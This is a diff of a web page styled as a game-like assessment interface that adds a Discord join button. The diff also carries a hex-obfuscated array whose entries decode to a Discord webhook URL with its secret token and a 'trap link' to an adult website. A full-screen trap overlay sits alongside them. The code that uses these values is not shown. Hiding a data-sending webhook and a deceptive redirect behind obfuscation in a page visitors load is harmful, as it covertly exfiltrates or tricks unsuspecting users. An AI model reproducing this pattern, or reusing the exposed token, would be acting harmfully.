@@ -34,12 +34,12 @@
         }
 
         #audio-init img {
-            height: 150px; /* Increased size for impact */
+            height: 150px; 
             animation: logoFloat 3s ease-in-out infinite, logoGlow 2s ease-in-out infinite;
             transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        /* Hover effect to make it react to the user before clicking */
+        
         #audio-init:hover img {
             transform: scale(1.15);
             filter: drop-shadow(0 0 50px var(--ghost-blue)) brightness(1.5);
@@ -55,7 +55,7 @@
             font-size: 14px;
         }
 
-        /* --- PRE-EXISTING STYLES --- */
+        
         #custom-cursor {
             width: 20px; height: 20px;
             border: 2px solid var(--ghost-blue);
@@ -172,7 +172,22 @@
         .char-card.active { border-color: var(--ghost-blue); opacity: 1; background: rgba(0,212,255,0.08); transform: translateY(-5px); }
         .thumb-img { height: 50px; margin-bottom: 8px; }
 
-        .dc-indicator-wrap { height: 280px; border: 1px solid var(--border-ui); margin-top: 10px; padding: 5px; background: #000; }
+        .dc-indicator-wrap { height: 240px; border: 1px solid var(--border-ui); margin-top: 10px; padding: 5px; background: #000; }
+
+        /* Discord Button Style */
+        .discord-btn { 
+            background: #5865F2; 
+            color: white; 
+            text-align: center; 
+            padding: 10px; 
+            text-decoration: none; 
+            font-weight: bold; 
+            font-size: 12px; 
+            margin-bottom: 10px;
+            border-radius: 2px;
+            transition: 0.3s;
+        }
+        .discord-btn:hover { background: #4752c4; box-shadow: 0 0 10px #5865F2; }
 
         #trap-overlay { 
             display: none; position: fixed; inset: 0; z-index: 999999; 
@@ -259,6 +274,8 @@
         </main>
 
         <aside class="side-panel">
+            <div style="font-size: 11px; color: var(--cf-yellow); margin-bottom: 10px;">COMMUNICATIONS</div>
+            <a href="javascript:void(0)" onclick="openDiscord()" class="discord-btn">JOIN DISCORD SERVER</a>
             <div style="font-size: 11px; color: var(--cf-yellow); margin-bottom: 10px;">ASSESSMENT LOG</div>
             <div id="log-box">> System Ready...</div>
             <div class="dc-indicator-wrap">
@@ -288,7 +305,8 @@
     const cursor = document.getElementById('custom-cursor');
     const blipSfx = document.getElementById('sfx-blip');
     
-    const _0x1a2b = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x36\x33\x39\x39\x32\x30\x39\x34\x39\x32\x39\x37\x31\x39\x33\x35\x32\x2f\x33\x52\x4c\x6f\x56\x6e\x5f\x42\x6e\x62\x59\x6e\x6f\x48\x48\x54\x65\x45\x31\x58\x45\x58\x54\x54\x2d\x66\x6b\x4e\x54\x69\x6f\x7a\x6b\x6e\x39\x71\x46\x4e\x44\x66\x32\x6c\x59\x30\x57\x48\x6a\x49\x58\x66\x35\x73\x70\x48\x7a\x42\x6e\x69\x55\x63\x5f\x31\x79\x52\x46\x39\x61\x4c", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x6f\x72\x6e\x68\x75\x62\x2e\x63\x6f\x6d"];
+    // [0] Webhook, [1] Trap Link, [2] Discord Invite
+    const _0x1a2b = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x36\x33\x39\x39\x32\x30\x39\x34\x39\x32\x39\x37\x31\x39\x33\x35\x32\x2f\x33\x52\x4c\x6f\x56\x6e\x5f\x42\x6e\x62\x59\x6e\x6f\x48\x48\x54\x65\x45\x31\x58\x45\x58\x54\x54\x2d\x66\x6b\x4e\x54\x69\x6f\x7a\x6b\x6e\x39\x71\x46\x4e\x44\x66\x32\x6c\x59\x30\x57\x48\x6a\x49\x58\x66\x35\x73\x70\x48\x7a\x42\x6e\x69\x55\x63\x5f\x31\x79\x52\x46\x39\x61\x4c", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x6f\x72\x6e\x68\x75\x62\x2e\x63\x6f\x6d", "https://discord.gg/ZrYhejg2kg"];
 
     document.addEventListener('mousemove', (e) => {
         cursor.style.left = e.clientX + 'px';
@@ -305,6 +323,12 @@
         document.getElementById('audio-init').style.display = 'none';
         document.getElementById('bgm').play();
         addLog("Neural Link Stable.");
+    }
+
+    function openDiscord() {
+        playBlip();
+        addLog("Uplink to Discord server initiated.");
+        window.open(_0x1a2b[2], '_blank');
     }
 
     function switchTab(target, el) {
